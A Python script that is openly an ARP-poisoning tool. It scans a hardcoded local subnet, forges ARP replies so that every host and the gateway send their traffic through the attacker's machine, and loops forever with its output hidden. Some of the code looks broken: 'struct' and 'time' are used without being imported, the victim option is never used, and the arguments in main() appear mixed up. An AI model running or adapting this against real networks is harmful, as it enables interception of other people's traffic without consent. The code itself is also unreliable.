#!/usr/bin/python3
"""
MIT License

Copyright (c) [2020] [Josip Stjepanović @github.com/jstjep00]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""


import sys
import os
import socket
import argparse
from getmac import get_mac_address
from scapy.all import send, arping, ARP


class ArpPacket:
    'ARP packet class to contruct for gateway and victim'

    def __init__(self, type_of_packet, target_tuple, localhost_tuple):
        self.type_of_packet = type_of_packet
        self.packet = ARP()

        # differentiate types of ARP packets between victim and gateway
        if self.type_of_packet=='victim':
            list_of_ips = []
            list_of_macs = []
            # add IPs and MACs of victims to lists for packet
            for i in range(len(target_tuple)):
                list_of_ips.append(target_tuple[i][0])
                list_of_macs.append(target_tuple[i][1])
            # set localhost as gateway ARP and add lists to packet
            self.packet.psrc = localhost_tuple[0]
            self.packet.pdst = list_of_ips
            self.packet.hwaddr = list_of_macs
            print('Victim ARP packets:')
            self.display_packets()

        if self.type_of_packet=='gateway':
            """
                if gateway packet is determined then send to gateway
                    acting as if localhost MAC is lan hosts IP list
                    so localhost gets lan hosts packets
            """

            list_of_ips = []
            for i in range(len(localhost_tuple)):
                list_of_ips.append(localhost_tuple[i][0])
            self.packet.pdst = target_tuple[0]
            self.packet.hwaddr = target_tuple[1]
            self.packet.psrc = list_of_ips
            print('Gateway ARP packet:')
            self.display_packets()

    def send_packets(self):
        print("Sending packets.\n")
        send(self.packet)

    def display_packets(self):
        print("Contents of the packets:\n")
        self.packet.display()

def get_default_gateway(interface):
    'Reading default gateway on linux from /proc'

    with open("/proc/net/route") as route_file:
        for line in route_file:
            fields = line.strip().split()
            if fields[0] == interface:
                if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                    continue
                else:
                    gateway_ip = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
                    gateway_mac = get_mac_address(ip=gateway_ip)
                    return (gateway_ip, gateway_mac)
        return None


def get_lan_hosts(interf, gateway_tuple):
    list_of_hosts_tuples = []
    # capturing ARP responses answered and unanswered from all IPs on local network
    ans, unans = arping('192.168.1.1/24')

    # going through every response
    for i in range(len(ans)):
        # if ARP response isn't gateway IP or MAC then add to hosts tuple
        if ans[i][1][1].psrc != gateway_tuple[0] and \
           ans[i][1][1].hwsrc != gateway_tuple[1]:
            list_of_hosts_tuples.append((ans[i][1][1].psrc, ans[i][1][1].hwsrc))
    return list_of_hosts_tuples


def get_localhost(interface):
    """
        Gets a localhost IP through simple socket, assuming you
            have an internet connection. Gets mac address of
            specified interface through get_mac
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    localhost_ip = s.getsockname()[0]
    s.close()
    localhost_mac = get_mac_address(interface=interface)
    return (localhost_ip, localhost_mac)


def text_animation(modulo):
    animation="|/-\\"
    print(animation[modulo % len(animation)], end="\r", flush=True)
    time.sleep(0.1)

def main():
    args = argparser()
    default_gateway = get_default_gateway(args.interface)
    localhost = get_localhost(args.interface)

    print('Localhost ip,mac:')
    print(localhost)
    lan_hosts = get_lan_hosts(args.interface, default_gateway)
    gateway = ArpPacket('gateway', default_gateway, lan_hosts)
    lan_hosts = ArpPacket('victim', lan_hosts, default_gateway)

    print("Sending packets:")
    save_stdout = sys.stdout
    sys.stdout = open('trash', 'w')
    while True:
        lan_hosts.send_packets()
        gateway.send_packets()

def argparser():
    descript = 'ARP poisoner for all local hosts over specific interface'
    parser = argparse.ArgumentParser(description=descript)

    parser.add_argument('-i', '--interface', metavar='interf', type=str,\
                         help='Interface used for ARP poisoning', required=True)
    parser.add_argument('-v', '--victim', metavar='victim_ip', type=str,\
                         help='Specific local host victim IP, if not specified then every host')

    args = parser.parse_args()
    return args


if __name__ == "__main__":
    main()
